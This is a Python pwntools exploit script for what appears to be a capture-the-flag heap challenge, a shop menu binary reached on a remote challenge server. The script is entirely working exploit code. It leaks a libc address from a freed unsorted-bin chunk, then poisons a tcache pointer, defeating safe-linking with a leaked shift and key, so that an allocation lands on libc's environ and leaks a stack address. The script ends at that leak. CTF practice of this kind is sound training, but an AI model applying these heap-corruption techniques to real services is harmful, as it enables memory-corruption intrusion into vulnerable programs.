from pwn import *

context.log_level = "info"

HOST, PORT = "chall.nypinfosec.net", 8002

UNSORTED_OFFSET = 0x210b20   # (main_arena+0x60) - libc_base (you derived this)
ENVIRON_OFF     = 0x217e28   # environ offset from readelf

def start():
    return remote(HOST, PORT)

def menu(io, c): io.sendlineafter(b"> ", str(c).encode())
def buy(io, i):  menu(io, 1); io.sendlineafter(b"> ", str(i).encode())
def sell(io, i): menu(io, 4); io.sendlineafter(b"> ", str(i).encode())

def name(io, i, data):
    menu(io, 2)
    io.sendlineafter(b"> ", str(i).encode())
    io.sendafter(b"Name your labubu\n", data)

def admire(io, i):
    menu(io, 3)
    io.sendlineafter(b"> ", str(i).encode())
    return io.recvn(0x400)

io = start()

# ---- libc leak via unsorted (same pattern as local) ----
for i in range(10):
    buy(io, i)

for i in range(7):
    sell(io, i)
sell(io, 7)              # unsorted (8 is fence)

leak = admire(io, 7)
fd = u64(leak[:8])
libc_base = fd - UNSORTED_OFFSET
environ_addr = libc_base + ENVIRON_OFF

log.success(f"fd leak    = {hex(fd)}")
log.success(f"libc_base  = {hex(libc_base)}")
log.success(f"environ@   = {hex(environ_addr)}")

# ---- drain tcache (7 entries) ----
for i in range(7):
    buy(io, i)

# ---- make single-entry tcache chunk at idx9 and poison to environ ----
sell(io, 9)
leak9 = admire(io, 9)
stored_fd  = u64(leak9[:8])      # chunk>>12 when next == NULL
tcache_key = u64(leak9[8:16])

chunk_shift = stored_fd
log.info(f"chunk_shift = {hex(chunk_shift)}")
log.info(f"tcache_key  = {hex(tcache_key)}")

poison_fd = environ_addr ^ chunk_shift
payload = p64(poison_fd) + p64(tcache_key) + b"\n"
name(io, 9, payload)

buy(io, 9)   # pops idx9 chunk back
buy(io, 8)   # idx8 now points to environ

env_data = admire(io, 8)
stack_ptr = u64(env_data[:8])
log.success(f"stack leak (environ) = {hex(stack_ptr)}")

io.close()
